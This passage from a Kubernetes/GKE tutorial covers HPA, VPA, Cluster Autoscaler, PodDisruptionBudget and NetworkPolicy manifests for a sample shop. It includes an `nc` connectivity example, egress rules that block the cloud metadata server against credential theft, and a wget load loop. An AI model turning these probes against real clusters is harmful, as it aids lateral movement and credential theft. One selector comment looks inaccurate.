          periodSeconds: 60
      selectPolicy: Min
```

`12-autoscaling/01-hpa-catalog.yaml`:

```yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: catalog
  namespace: shopwave-prod
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: catalog
  minReplicas: 1
  maxReplicas: 3
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 65
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 30
      policies:
        - type: Percent
          value: 100
          periodSeconds: 30
    scaleDown:
      stabilizationWindowSeconds: 300
      policies:
        - type: Pods
          value: 1
          periodSeconds: 120
```

`12-autoscaling/02-hpa-orders.yaml` — custom metric:

```yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: orders
  namespace: shopwave-prod
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: orders
  minReplicas: 1
  maxReplicas: 3
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70
    - type: Pods
      pods:
        metric:
          name: shopwave_orders_inflight
        target:
          type: AverageValue
          averageValue: "12"
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 15
      policies:
        - type: Percent
          value: 100
          periodSeconds: 15
    scaleDown:
      stabilizationWindowSeconds: 600
      policies:
        - type: Pods
          value: 1
          periodSeconds: 180
```

### The formula — know it exactly

```
desiredReplicas = ceil( currentReplicas × ( currentMetricValue / desiredMetricValue ) )
```

Example: 4 replicas at 90% CPU, target 60% → `ceil(4 × 90/60)` = `ceil(6)` = **6 replicas**.

The HPA controller loops every **15 seconds** (`--horizontal-pod-autoscaler-sync-period`).

> **`averageUtilization` is a percentage of `requests`, NOT of the limit, and NOT of the node.**
>
> `averageUtilization: 60` with `requests.cpu: 100m` means the HPA scales at **60m of actual CPU**. If your `limits.cpu` is 500m, your pod can use 500m — **500% "utilization"** — and the HPA will have scaled to `maxReplicas` long before the pod is anywhere near its limit.
>
> **A pod with no CPU request has no HPA.** The HPA cannot compute a percentage of nothing. It reports `<unknown>` in the TARGETS column and **does nothing at all, silently**. This is the #1 "my HPA isn't working" cause, and our LimitRange from Part 3 is what prevents it.

> **Multiple metrics: the HPA computes a desired replica count for EACH metric independently and takes the MAXIMUM.** Not an average, not a weighted blend. So adding a memory metric to a CPU-driven HPA can only ever make it scale **up more**, never down. People add memory expecting nuance and get a permanently maxed-out Deployment because their app caches aggressively and memory utilisation never drops.

### `behavior` — the asymmetry is the point

> **Scale up fast, scale down slow.** The cost of scaling up too eagerly is a few rupees. The cost of scaling down too eagerly is an outage when traffic returns 30 seconds later — and then a thundering herd of cold-cache pods.
>
> - `scaleUp.stabilizationWindowSeconds: 30` — react quickly.
> - `scaleDown.stabilizationWindowSeconds: 300` — the HPA takes the **maximum** desired-replica recommendation over the last 5 minutes. So it will not scale down until traffic has been genuinely low for a full 5 minutes. **This is what kills flapping.**
> - `selectPolicy: Max` on up, `Min` on down — pick the most aggressive up policy, the gentlest down policy.
> - `orders` gets `scaleDown: 600s` and 1 pod per 3 minutes, because killing an orders pod means draining transactions.

Before `behavior` existed (pre-1.18), scale-down was hardcoded to a 5-minute window and you had no control. `behavior` is the answer to every "how do you stop your HPA flapping?" question.

### Custom metrics

`type: Pods` and `type: External` need the **custom metrics API** — on GKE, the **Custom Metrics Stackdriver Adapter** or the **prometheus-adapter**. `type: Resource` (CPU/memory) only needs `metrics-server`, which GKE runs for you.

```bash
kubectl apply -f https://raw.githubusercontent.com/GoogleCloudPlatform/k8s-stackdriver/master/custom-metrics-stackdriver-adapter/deploy/production/adapter_new_resource_model.yaml

kubectl get apiservice v1beta1.custom.metrics.k8s.io
kubectl get --raw /apis/custom.metrics.k8s.io/v1beta1 | jq .
```

> **`shopwave_orders_inflight` — scaling on the right signal.** CPU is a *proxy* for load. In-flight transactions is the *actual* thing you care about. An orders pod blocked on a slow Postgres has **low CPU and high in-flight count** — a CPU-based HPA would see an idle pod and **scale down** exactly when you need more concurrency. Scaling on a business metric (queue depth, in-flight requests, RPS) rather than CPU is the difference between an autoscaler that works and one that's decorative. This is the best HPA point you can make.

## 14.2 VPA

`12-autoscaling/10-vpa.yaml`:

```yaml
apiVersion: autoscaling.k8s.io/v1
kind: VerticalPodAutoscaler
metadata:
  name: catalog
  namespace: shopwave-prod
spec:
  targetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: catalog
  updatePolicy:
    updateMode: "Off"
  resourcePolicy:
    containerPolicies:
      - containerName: catalog
        minAllowed:
          cpu: 50m
          memory: 64Mi
        maxAllowed:
          cpu: "2"
          memory: 2Gi
        controlledResources:
          - cpu
          - memory
        controlledValues: RequestsAndLimits
---
apiVersion: autoscaling.k8s.io/v1
kind: VerticalPodAutoscaler
metadata:
  name: postgres
  namespace: shopwave-prod
spec:
  targetRef:
    apiVersion: apps/v1
    kind: StatefulSet
    name: postgres
  updatePolicy:
    updateMode: "Off"
  resourcePolicy:
    containerPolicies:
      - containerName: postgres
        minAllowed:
          cpu: 250m
          memory: 512Mi
        maxAllowed:
          cpu: "4"
          memory: 8Gi
```

```bash
kubectl describe vpa catalog -n shopwave-prod
```

Four modes:

| Mode | Behaviour |
|---|---|
| `Off` | **Recommendations only.** Nothing changes. |
| `Initial` | Applies at pod **creation** only. |
| `Recreate` | **Evicts and recreates** pods to apply new values. |
| `Auto` | Currently == `Recreate`. |

> **`updateMode: "Off"` is the honest production answer**, and saying so is stronger than pretending you run VPA in Auto.
>
> **The problem:** `Recreate`/`Auto` **kills your pods to resize them**. There is no in-place resize (the `InPlacePodVerticalScaling` KEP is still alpha/beta and not GA). So VPA in Auto mode is a background process that **restarts your production pods** on its own schedule, based on a rolling histogram. It respects PDBs, but it's still unplanned churn.
>
> **The bigger problem — and this is the classic interview question:**
>
> > **"Can you run HPA and VPA on the same workload?"**
> >
> > **On the same metric: NO, and it's a disaster.** VPA raises `requests` → utilisation is `usage/requests`, so utilisation **drops** → HPA scales **down** → the remaining pods get busier → VPA raises requests again → HPA scales down again. **They fight each other in a feedback loop**, and the workload oscillates.
> >
> > **Legitimate combinations:** HPA on a **custom metric** (RPS, queue depth) + VPA on CPU/memory — no shared signal, no loop. Or the pragmatic one we use: **VPA in `Off` mode as a right-sizing recommender**, a human reads it, and the requests are changed in the manifest via a PR.
>
> GKE's **Multidimensional Pod Autoscaling** is the supported way to do both: HPA on **CPU**, VPA on **memory only**. Different resources, no shared signal.

## 14.3 Cluster Autoscaler

Already enabled per node pool (Part 2).

```bash
gcloud container clusters update $CLUSTER --region=$REGION \
  --autoscaling-profile=optimize-utilization
```

### Scale-up

1. A pod is **Pending** with `reason: Unschedulable`.
2. CA **simulates** scheduling against each node pool's **template** (machine type, labels, taints).
3. If a new node from pool X would fit the pod, CA increases that MIG's size.
4. Node joins in **~60–120s** (boot + kubelet register + image pull).

> **CA is triggered by Pending pods, not by utilisation.** A cluster at 99% CPU with zero Pending pods will **never scale up**. That's correct — Kubernetes has no unmet demand. And it's why under-requesting causes hotspots that autoscaling won't fix: from the scheduler's view there's plenty of room.

### Scale-down — where all the bugs are

A node is removed when, for **10 minutes** (`--scale-down-unneeded-time`):
- utilisation (**sum of requests** / allocatable) is below **50%** (`--scale-down-utilization-threshold`), **and**
- every pod on it can be **rescheduled elsewhere**.

> **The pods that BLOCK scale-down — memorise this list. It is asked constantly and it explains every "why is my cluster not scaling down and costing me money?" ticket:**
>
> 1. **Pods with local storage** (`emptyDir`, `hostPath`) — CA won't evict them by default, because the data would be lost. **This is the #1 blocker.** Override per-pod:
>    ```yaml
>    annotations:
>      cluster-autoscaler.kubernetes.io/safe-to-evict: "true"
>    ```
> 2. **Pods with restrictive PDBs** — if evicting would violate the PDB, the node stays. A PDB with `minAvailable: 100%` **pins the node forever**.
> 3. **Pods with no controller** — a bare pod (no Deployment/RS/Job/StatefulSet) can't be recreated, so CA won't touch it.
> 4. **`kube-system` pods without a PDB** — CA is conservative about them by default.
> 5. **Pods with restrictive node affinity/anti-affinity** that can't be satisfied anywhere else.
> 6. Anything explicitly annotated `cluster-autoscaler.kubernetes.io/safe-to-evict: "false"`.
>
> The **single most common real cause**: one pod with an `emptyDir` (for a cache, or `/tmp`) on an otherwise-empty node, holding a whole VM alive at ₹15,000/month.

> **Protect a node from scale-down** (e.g. a long-running job you must not interrupt):
> ```yaml
> metadata:
>   annotations:
>     cluster-autoscaler.kubernetes.io/safe-to-evict: "false"
> ```

**Autoscaling profiles:**

| Profile | Behaviour |
|---|---|
| `balanced` | Default. Conservative scale-down; keeps headroom. |
| `optimize-utilization` | Aggressive scale-down; packs tighter; more churn, lower cost. |

### Overprovisioning — the pattern for burst

CA takes 60–120s to add a node. For a flash sale, that's an eternity. The standard trick:

`12-autoscaling/20-overprovisioning.yaml`:

```yaml
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: overprovisioning
value: -10
globalDefault: false
description: "Placeholder pods. Negative priority: preempted by ANY real pod."
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: overprovisioning
  namespace: platform
spec:
  # FREE TIER: set to 0. Two pause pods reserve 2 vCPU + 4Gi, which you cannot
  # spare on a 12-vCPU cluster. Read the pattern; deploy it only with real quota.
  replicas: 0
  selector:
    matchLabels:
      app.kubernetes.io/name: overprovisioning
  template:
    metadata:
      labels:
        app.kubernetes.io/name: overprovisioning
    spec:
      priorityClassName: overprovisioning
      terminationGracePeriodSeconds: 0
      containers:
        - name: pause
          image: registry.k8s.io/pause:3.9
          resources:
            requests:
              cpu: "1"
              memory: 2Gi
            limits:
              cpu: "1"
              memory: 2Gi
```

> **How it works, and it's beautiful:** these pods do **nothing** — `pause` just sleeps. But they **request** real CPU and memory, so the Cluster Autoscaler keeps nodes alive to host them. Their priority is **negative**, so the instant a real pod is Pending, the scheduler **preempts them** and takes their space **immediately** — no 2-minute node boot. The placeholder pods then go Pending themselves, which triggers CA to add a node in the background, restoring the buffer.
>
> **You are paying for warm capacity, expressed entirely in Kubernetes primitives.** No custom controller, no cloud API. This is one of the best patterns to know and it demonstrates that you understand priority, preemption, and CA as one system.

## 14.4 PodDisruptionBudgets

`12-autoscaling/30-pdb.yaml`:

```yaml
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: frontend
  namespace: shopwave-prod
spec:
  minAvailable: 2
  selector:
    matchLabels:
      app.kubernetes.io/name: frontend
      app.kubernetes.io/instance: frontend-prod
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: catalog
  namespace: shopwave-prod
spec:
  minAvailable: 2
  selector:
    matchLabels:
      app.kubernetes.io/name: catalog
      app.kubernetes.io/instance: catalog-prod
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: cart
  namespace: shopwave-prod
spec:
  maxUnavailable: 1
  selector:
    matchLabels:
      app.kubernetes.io/name: cart
      app.kubernetes.io/instance: cart-prod
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: orders
  namespace: shopwave-prod
spec:
  minAvailable: 2
  selector:
    matchLabels:
      app.kubernetes.io/name: orders
      app.kubernetes.io/instance: orders-prod
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: payments
  namespace: shopwave-prod
spec:
  minAvailable: 2
  selector:
    matchLabels:
      app.kubernetes.io/name: payments
      app.kubernetes.io/instance: payments-prod
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: inventory
  namespace: shopwave-prod
spec:
  maxUnavailable: 1
  selector:
    matchLabels:
      app.kubernetes.io/name: inventory
      app.kubernetes.io/instance: inventory-prod
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: postgres
  namespace: shopwave-prod
spec:
  maxUnavailable: 0
  selector:
    matchLabels:
      app.kubernetes.io/name: postgres
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: redis
  namespace: shopwave-prod
spec:
  maxUnavailable: 1
  selector:
    matchLabels:
      app.kubernetes.io/name: redis
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: search
  namespace: shopwave-prod
spec:
  minAvailable: 2
  selector:
    matchLabels:
      app.kubernetes.io/name: search
```

### What a PDB does and — critically — does not do

> **A PDB only constrains VOLUNTARY disruptions.** Say this precisely:
>
> | **Voluntary** — PDB applies | **Involuntary** — PDB does NOT apply |
> |---|---|
> | `kubectl drain` | Node hardware failure |
> | Node pool upgrade | Kernel panic |
> | Cluster Autoscaler scale-down | **OOMKill** |
> | Descheduler eviction | **Node runs out of disk → eviction** |
> | `kubectl delete pod` via the **Eviction API** | `kubectl delete pod` **directly** |
> | Spot preemption (as a graceful eviction) | Zone outage |
>
> **A PDB with `minAvailable: 3` will not stop a node fire from taking all 3 of your pods.** It is a *coordination* mechanism for planned operations, not a durability guarantee. People believe PDBs make them highly available. They do not. **Anti-affinity and topology spread make you available; a PDB stops your own maintenance from taking you down.**
>
> Mechanically: the PDB is enforced by the **API server on the `pods/eviction` subresource**. `kubectl drain` calls the Eviction API and gets a `429 Too Many Requests` if the budget would be violated, so it waits and retries. `kubectl delete pod` calls **DELETE on the pod**, which bypasses the eviction path entirely. That's why "the PDB didn't work" is usually "you deleted, you didn't evict."

### The `maxUnavailable: 0` trap

> **`postgres` has `maxUnavailable: 0` with `replicas: 1`.** This means: **no voluntary disruption, ever**. Which means:
>
> - **`kubectl drain` on that node will hang forever.**
> - **A node pool upgrade will stall** — GKE retries for ~1 hour and then **force-deletes the pod anyway**, which is exactly what you were trying to prevent, except now it happens at a random moment with no human present.
> - **The Cluster Autoscaler will never remove that node.**
>
> This is deliberate here — a single-replica database *should* require a human decision to move. But **you must know you've done it**, and you must have a runbook: manually fail over / stop the DB / temporarily relax the PDB, drain, restore. **An undocumented `maxUnavailable: 0` is a landmine you leave for the person on call.**
>
> The related bug: **`minAvailable` equal to `replicas`** (e.g. `minAvailable: 3` on a 3-replica Deployment) is `maxUnavailable: 0` in disguise, and people write it by accident all the time. It blocks every drain and every upgrade in the cluster, and the symptom is "our node upgrades have been stuck for three weeks."

**Percentages round in your favour... sort of:**

```yaml
minAvailable: "50%"     # 3 replicas -> ceil(1.5) = 2 must stay up
maxUnavailable: "50%"   # 3 replicas -> floor(1.5) = 1 may go down
```

`minAvailable` rounds **up**, `maxUnavailable` rounds **down** — both err toward availability.

```bash
kubectl get pdb -n shopwave-prod
kubectl describe pdb orders -n shopwave-prod
```

`ALLOWED DISRUPTIONS: 1` is the number that matters. If it's `0` when it shouldn't be, your next drain hangs.

## 14.5 Test it

```bash
kubectl apply -f 12-autoscaling/

kubectl get hpa -n shopwave-prod -w

# Generate load against /burn
kubectl run load -n shopwave-prod --rm -it --image=busybox:1.36 --restart=Never -- \
  sh -c 'while true; do wget -q -O- http://frontend/burn?ms=300 > /dev/null; done'

# In another terminal
kubectl get hpa frontend -n shopwave-prod -w
kubectl get pods -n shopwave-prod -l app.kubernetes.io/name=frontend -w
kubectl describe hpa frontend -n shopwave-prod

# Watch the Cluster Autoscaler add nodes
kubectl get nodes -w
kubectl get events -n shopwave-prod --field-selector reason=TriggeredScaleUp
```

Debug an HPA:

```bash
kubectl describe hpa frontend -n shopwave-prod
kubectl top pods -n shopwave-prod
kubectl get --raw /apis/metrics.k8s.io/v1beta1/namespaces/shopwave-prod/pods | jq .
```

> **`TARGETS: <unknown>/60%`** means the HPA cannot read the metric. Three causes, in order of likelihood: **(1) the pod has no CPU request**; (2) metrics-server is down or the pod is too new (~30s of history needed); (3) for custom metrics, the adapter's APIService isn't `Available`. Check in that order.

## 14.6 Part 14 interview talking points

- The HPA formula, the 15s loop
- **Utilization is a % of `requests`** — not limits, not the node; **no request = no HPA, silently**
- **Multiple metrics → max, not average** — adding memory can only scale you up
- `behavior`: fast up / slow down; the 300s stabilisation window takes the **max** recommendation
- **Scaling on a business metric** (in-flight, queue depth) vs CPU, and why CPU lies for I/O-bound services
- **HPA + VPA on the same metric = a feedback loop.** The legitimate combos; GKE MPA
- VPA `Recreate` restarts your pods; no in-place resize; `Off` mode as a recommender is the honest answer
- CA is driven by **Pending pods**, not utilisation
- **The scale-down blocker list**, with `emptyDir` at the top
- The overprovisioning pattern: negative priority + pause pods = warm capacity from pure primitives
- **PDBs cover voluntary disruptions only** — not OOMKill, not node death; enforced on `pods/eviction`; `delete` bypasses it
- `maxUnavailable: 0` / `minAvailable == replicas` blocks every drain and upgrade — and GKE force-deletes after ~1h anyway
- `minAvailable` rounds up, `maxUnavailable` rounds down


---

# Part 15 — Security and NetworkPolicy

## 15.1 The default state is terrifying

By default, in **every** Kubernetes cluster ever built:

> **Every pod can reach every other pod, in every namespace, on every port.**

`frontend` can open a TCP connection to `postgres:5432`. A compromised `notifications` pod running on a **Spot** node can reach `payments`. There is no segmentation. `kubectl exec` into anything and `nc payments 8080` works.

**NetworkPolicy is the fix, and it only exists if you write it.**

## 15.2 Default deny — the foundation

`13-security/00-default-deny.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: shopwave-prod
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
```

That is the whole object. `podSelector: {}` = **every pod in the namespace**. `policyTypes` listed with **no rules** = **deny everything, both directions**.

> **How NetworkPolicy evaluation actually works — get this right and everything else follows:**
>
> 1. **A pod with NO NetworkPolicy selecting it is completely open.** Not "default deny". Wide open.
> 2. **The moment ANY policy selects a pod for a direction, that pod becomes default-deny for that direction**, and only the union of matching policies' rules is allowed.
> 3. **Policies are purely ADDITIVE. There is no deny rule.** You cannot write "allow all except X". You express deny by *not* allowing.
> 4. **Ingress and Egress are evaluated independently, on both ends.** A connection from A to B needs A's **egress** to permit it **and** B's **ingress** to permit it. **Both.** Forget one side and the packet dies with no error, no log, just a timeout.
> 5. **NetworkPolicy is stateful** (connection-tracking). Allowing ingress on 8080 automatically permits the **response** packets. You do **not** need a matching egress rule for replies. People write ephemeral-port egress rules for return traffic and it means they don't understand this.

Apply that manifest and **your entire namespace goes dark**. Including DNS. Which is the next thing.

## 15.3 Allow DNS — do this immediately or nothing works

`13-security/01-allow-dns.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns-egress
  namespace: shopwave-prod
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
        - protocol: TCP
          port: 53
```

> **This is the #1 NetworkPolicy mistake in the world, and it is worth being specific about.**
>
> You apply default-deny. Everything breaks. But the symptom is **not** "connection refused" — it's your application logs filling with `Name or service not known` and **5-second timeouts on every single call**, including to services you thought you'd allowed.
>
> Why: your pod's egress to `catalog` is allowed — but the pod first has to **resolve** `catalog`, which means a UDP/53 packet to CoreDNS **in `kube-system`**, which your default-deny blocked. Every name lookup fails. The app looks like it has a DNS problem, or a mysterious latency problem, and people spend hours on it.
>
> **`kubernetes.io/metadata.name` is an automatic label** the API server puts on every namespace (since 1.21). You don't have to label kube-system yourself.
>
> **TCP/53 as well as UDP/53** — DNS falls back to TCP for responses over 512 bytes, and NodeLocal DNSCache uses TCP upstream by default. Allow only UDP and you get *intermittent* failures on large responses, which is a far worse bug than a total one.

## 15.4 The service-to-service policies

`13-security/10-frontend.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend
  namespace: shopwave-prod
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: frontend
  policyTypes:
    - Ingress
    - Egress
  ingress:
    # From the Google load balancer health checkers and proxies.
    # NOTE: with NEGs the LB talks DIRECTLY to the pod IP, so this must
    # be an ipBlock - there is no pod or namespace to select.
    - from:
        - ipBlock:
            cidr: 35.191.0.0/16
        - ipBlock:
            cidr: 130.211.0.0/22
      ports:
        - protocol: TCP
          port: 8080
    # From Prometheus
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
          podSelector:
            matchLabels:
              app.kubernetes.io/name: prometheus
      ports:
        - protocol: TCP
          port: 8080
  egress:
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: catalog
      ports:
        - protocol: TCP
          port: 8080
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: cart
      ports:
        - protocol: TCP
          port: 8080
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: orders
      ports:
        - protocol: TCP
          port: 8080
```

`13-security/11-catalog.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: catalog
  namespace: shopwave-prod
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: catalog
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: frontend
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: cart
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: orders
      ports:
        - protocol: TCP
          port: 8080
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
      ports:
        - protocol: TCP
          port: 8080
  egress:
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: postgres
      ports:
        - protocol: TCP
          port: 5432
```

`13-security/12-cart.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: cart
  namespace: shopwave-prod
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: cart
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: frontend
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: orders
      ports:
        - protocol: TCP
          port: 8080
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
      ports:
        - protocol: TCP
          port: 8080
  egress:
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: redis
      ports:
        - protocol: TCP
          port: 6379
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: catalog
      ports:
        - protocol: TCP
          port: 8080
```

`13-security/13-orders.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: orders
  namespace: shopwave-prod
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: orders
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: frontend
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: notifications
      ports:
        - protocol: TCP
          port: 8080
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
      ports:
        - protocol: TCP
          port: 8080
  egress:
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: postgres
      ports:
        - protocol: TCP
          port: 5432
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: cart
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: payments
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: inventory
      ports:
        - protocol: TCP
          port: 8080
```

### `13-security/14-payments.yaml` — the PCI policy

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payments
  namespace: shopwave-prod
  annotations:
    shopwave.io/compliance: "PCI-DSS 1.2, 1.3 - network segmentation of the CDE"
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: payments
  policyTypes:
    - Ingress
    - Egress
  ingress:
    # ONE source. Only orders may call payments. Nothing else. Ever.
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: orders
      ports:
        - protocol: TCP
          port: 8080
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
          podSelector:
            matchLabels:
              app.kubernetes.io/name: prometheus
      ports:
        - protocol: TCP
          port: 8080
  egress:
    # DNS only from the shared policy, plus:
    # HTTPS to the internet for the payment provider.
    # This is the CDE's ONLY egress and it is TLS-only.
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8
              - 172.16.0.0/12
              - 192.168.0.0/16
              - 169.254.0.0/16
      ports:
        - protocol: TCP
          port: 443
```

> **Read that `except` block — it is the most security-relevant thing in this document.**
>
> The naive rule "allow egress to `0.0.0.0/0:443`" also allows egress to **every pod in the cluster**, **every VM in your VPC**, and **`169.254.169.254` — the metadata server**. `0.0.0.0/0` includes RFC1918. It includes link-local. A compromised `payments` pod could exfiltrate to any internal service, or try to steal node credentials, and your "internet-only" policy permitted it.
>
> The `except` clauses carve out all private space, so the rule genuinely means **"the public internet, and nothing else."**
>
> This is exactly the kind of detail that separates someone who has written a NetworkPolicy from someone who has written a NetworkPolicy that a PCI auditor accepted. It is one of the strongest specific things you can bring to a security question.

`13-security/15-inventory.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: inventory
  namespace: shopwave-prod
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: inventory
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: orders
      ports:
        - protocol: TCP
          port: 8080
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
      ports:
        - protocol: TCP
          port: 8080
  egress:
    # inventory talks to the KUBERNETES API SERVER for leader election.
    # On a private GKE cluster the master is at the master CIDR.
    - to:
        - ipBlock:
            cidr: 172.16.0.0/28
      ports:
        - protocol: TCP
          port: 443
```

> **That last rule is a gotcha worth its own paragraph.** `inventory` does leader election, so it calls the **API server**. Under default-deny egress, that call is blocked — and the failure is a `kubernetes.default.svc` timeout that looks like RBAC, or like a broken client library, or like anything except a NetworkPolicy. You cannot use a `podSelector` for the API server: **on GKE the control plane is not a pod in your cluster**, it lives in Google's project. You must allow the **master CIDR as an `ipBlock`**. On a self-managed cluster you'd allow the `kubernetes` Service's endpoints instead. This is a GKE-specific trap and a great thing to know.

`13-security/16-postgres.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: postgres
  namespace: shopwave-prod
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: postgres
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: catalog
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: orders
      ports:
        - protocol: TCP
          port: 5432
  egress: []
```

> **`egress: []` on postgres.** An **empty list**, not an omitted field. `policyTypes: [Egress]` with `egress: []` = **postgres may not initiate any outbound connection at all**. Not to the internet, not to another pod, nothing. A database has no business dialling out; if it ever does, that's an exfiltration attempt. This is a genuinely strong control and it costs one line.
>
> (Note: it also means postgres can't do DNS — but it doesn't need to, since nothing in its config resolves names. If it did, you'd re-add the DNS rule. The shared `allow-dns-egress` policy selects `{}` = all pods, so postgres **does** get DNS from that policy — remember, policies are **additive**, so `egress: []` here plus the DNS policy's egress = DNS only. That interaction is exactly the "policies are additive" rule in action, and it's worth tracing out loud.)

`13-security/17-redis.yaml`, `18-search.yaml`, `19-notifications.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: redis
  namespace: shopwave-prod
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: redis
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: cart
      ports:
        - protocol: TCP
          port: 6379
    # Replica -> primary replication
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: redis
      ports:
        - protocol: TCP
          port: 6379
  egress:
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: redis
      ports:
        - protocol: TCP
          port: 6379
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: search
  namespace: shopwave-prod
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: search
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: catalog
      ports:
        - protocol: TCP
          port: 9200
    # Intra-cluster transport between search nodes
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: search
      ports:
        - protocol: TCP
          port: 9300
        - protocol: TCP
          port: 9200
  egress:
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: search
      ports:
        - protocol: TCP
          port: 9300
        - protocol: TCP
          port: 9200
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: notifications
  namespace: shopwave-prod
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: notifications
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: orders
      ports:
        - protocol: TCP
          port: 8080
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
      ports:
        - protocol: TCP
          port: 8080
  egress:
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: orders
      ports:
        - protocol: TCP
          port: 8080
```

> **The `redis` and `search` policies both select themselves on both sides.** Peer-to-peer replication is pod-to-pod within the same workload — you need to allow it explicitly, and it looks strange until you realise the policy is symmetric because the traffic is. Forgetting this is why "my Elasticsearch cluster won't form a quorum after I applied NetworkPolicy" happens.

### The AND vs OR trap — the most subtle thing in NetworkPolicy

```yaml
# TWO SEPARATE ELEMENTS in the `from` list = OR.
# "pods labelled X in ANY namespace" OR "ANY pod in namespace Y"
ingress:
  - from:
      - namespaceSelector:
          matchLabels:
            kubernetes.io/metadata.name: monitoring
      - podSelector:
          matchLabels:
            app.kubernetes.io/name: prometheus
